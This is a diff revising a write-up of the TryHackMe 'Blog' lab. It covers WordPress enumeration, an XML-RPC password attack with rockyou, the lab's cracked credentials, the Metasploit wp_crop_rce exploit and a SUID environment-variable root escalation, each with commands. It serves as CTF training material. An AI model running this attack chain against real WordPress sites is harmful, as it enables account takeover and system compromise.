@@ -1,112 +1,76 @@
 # Blog - TryHackMe
 
-Linux machine running a personal WordPress blog with SSH and SMB also exposed. The lab requires proper web application enumeration before any exploitation is possible - all three non-HTTP services are either dead ends or supporting context.
+Linux machine running a WordPress blog, with SSH and SMB also exposed but neither useful
+without credentials. The path runs through WordPress user enumeration, an XML-RPC credential
+attack, a known plugin RCE, and a custom SUID binary with a logic flaw.
+
+Target: `10.64.164.200` (`blog.thm`)
 
 ---
 
-## Objectives
+## Reconnaissance
 
-- Identify exposed network services
-- Properly enumerate a WordPress application
-- Discover valid credentials through enumeration, not guessing
-- Achieve initial access
-- Perform local enumeration and privilege escalation
-- Retrieve user and root flags
+```bash
+nmap -sC -sV 10.64.164.200
+```
 
----
-
-## Methodology Overview
-
-The lab followed a structured penetration testing approach:
-
-1. Network Scanning
-2. Service Enumeration
-3. Web Application Enumeration
-4. Credential Discovery
-5. Initial Access
-6. Local Enumeration
-7. Privilege Escalation
+Three services: SSH (22), HTTP (80), SMB (139/445). Neither SSH nor SMB accept anonymous
+access without credentials, so the web application is the way in.
 
 ---
 
 ## Enumeration
 
-Enumeration was the most critical phase of this lab.  
+### Web Application
 
-Multiple services were exposed, but only **one path was actually viable**.
+The site doesn't resolve properly by IP - it needs the vhost:
 
-### Network & Service Discovery
+```bash
+echo "10.64.164.200 blog.thm" | sudo tee -a /etc/hosts
+```
 
-An initial Nmap scan revealed the following services:
+Browsing to `blog.thm` shows a WordPress site. A scan confirms the version and a few issues:
 
-- **SSH (22)**
-- **HTTP (80)**
-- **SMB (139, 445)**
+```bash
+wpscan --url http://blog.thm -e u,vp
+```
 
-While SSH and SMB appeared interesting, neither provided immediate access without credentials.  
+- WordPress 5.0 (outdated)
+- XML-RPC enabled
+- Directory listing enabled on `/wp-content/uploads/`
+- Two usernames: `bjoel`, `kwheel`
 
-This reinforced the importance of **prioritizing application-layer enumeration**.
+No plugin gives a direct exploit, so the next step is finding valid credentials for one of
+these two users.
+
+### SMB Share
+
+```bash
+smbclient -L //10.64.164.200/ -N
+```
+
+An anonymous share is readable, holding media files with no obvious secrets - one of the
+filenames is the actual hint, pointing toward a password rather than a technical exploit.
+
+### Credential Discovery via XML-RPC
+
+WPScan's XML-RPC password attack, using the two usernames found earlier, returns a working
+pair:
+
+```bash
+wpscan --url http://blog.thm -U bjoel,kwheel --password-attack xmlrpc -P /usr/share/wordlists/rockyou.txt
+```
+
+```
+kwheel : cutiepie1
+```
 
 ---
 
-### Web Enumeration (HTTP)
-
-The web service initially appeared broken. 
-
-Adding the following entry to `/etc/hosts` was required:
-
-10.64.164.200 blog.thm
-
-Once resolved, the application was identified as WordPress.
-
-## Key findings:
-
-- WordPress version **5.0** (outdated)
-- XML-RPC enabled
-- Directory listing enabled on `/wp-content/uploads/`
-- Administrative paths exposed via `robots.txt`
-
-## WordPress Enumeration (WPScan)
-
-WPScan was used to enumerate users and configuration issues.
-
-Identified users:
-
-- `bjoel`
-- `kwheel`
-
-No plugins or direct vulnerabilities were immediately exposed.
-
-Rather than forcing exploits, the focus shifted to **credential discovery** via XML-RPC.
-
-## SMB Enumeration
-
-SMB enumeration revealed a share with **anonymous read/write access**.
-
-Files within the share appeared benign but contained **indirect hints**:
-
-- Media files
-- Encoded references
-- Contextual clues related to user credentials
-
-This reinforced an important lesson:
-
-Enumeration is not about file type, but about information value.
-
-## Credential Discovery
-
-Using WPScan against the XML-RPC endpoint with the discovered usernames led to valid credentials:
-
-- **Username**: `kwheel`
-- **Password**: `cutiepie1`
-
-This step was achieved through targeted enumeration, not blind brute forcing.
-
 ## Initial Access
 
-With valid credentials, a WordPress Remote Code Execution vulnerability was leveraged.
-
-Using Metasploit:
+With valid WordPress credentials, a known RCE module targeting the crop-image endpoint
+works directly:
 
 ```bash
 use exploit/multi/http/wp_crop_rce
@@ -115,58 +79,54 @@ set USERNAME kwheel
 set PASSWORD cutiepie1
 run
 ```
-A shell was obtained as the `www-data` user.
 
-The shell was upgraded to a proper TTY for stability:
-```python
+Shell as `www-data`. Upgrade to a proper TTY:
+
+```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
+---
+
 ## Local Enumeration
 
-Post-exploitation enumeration revealed:
+`bjoel`'s home directory holds a PDF that isn't the flag - it's a hint pointing toward a
+custom binary rather than a standard privilege escalation path.
 
-- User home directories
-- A fake `user.txt` flag
-- A suspicious PDF file belonging to user `bjoel`
-
-The PDF contained contextual hints pointing toward **privilege escalation**, rather than a direct exploit.
+---
 
 ## Privilege Escalation
 
-Enumerating SUID binaries revealed a custom binary:
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
-The binary performed a check against an environment variable named `admin`.
 
-Reverse engineering revealed:
+A non-standard SUID binary shows up: `/usr/sbin/checker`. Reversing it shows the logic: it
+checks whether an environment variable called `admin` is set, and if so, spawns a root shell.
 
-If `admin` was set, the binary would spawn a root shell.
-
-Exploitation:
 ```bash
 export admin=anyvalue
 /usr/sbin/checker
 ```
-This resulted in a **root shell**.
 
-## Flags
+Root shell. User flag is under `/media/usb/`, root flag under `/root/`.
 
-```
-user.txt  -> /media/usb/user.txt
-root.txt  -> /root/root.txt
-```
+---
 
 ## Key Takeaways
 
-- Enumeration is more important than exploitation
-- Not all exposed services are useful entry points
-- WordPress misconfigurations often lead to credential disclosure
-- SMB shares can act as **information carriers**, not just file storage
-- Custom binaries frequently introduce logic flaws exploitable via environment variables
-- Methodology beats guessing every time
+- SSH and SMB being open doesn't mean they're the way in - check the actual web application
+  first when one is present.
+- WPScan's XML-RPC password attack is faster and quieter than brute-forcing the login page
+  directly.
+- A "hint" file sitting in an SMB share or home directory is often more valuable than the
+  standard SUID/sudo checklist - look for it before running the usual privesc scripts.
+- Custom SUID binaries are worth reversing: environment-variable checks like this one are a
+  common and easy-to-miss logic flaw.
+
+---
 
 ## Disclaimer
 
-This lab was completed in a controlled and legal environment provided by **TryHackMe**.
-All actions were performed strictly for educational purposes.
+This lab was completed in a controlled environment provided by TryHackMe. All actions were
+performed strictly for educational purposes.
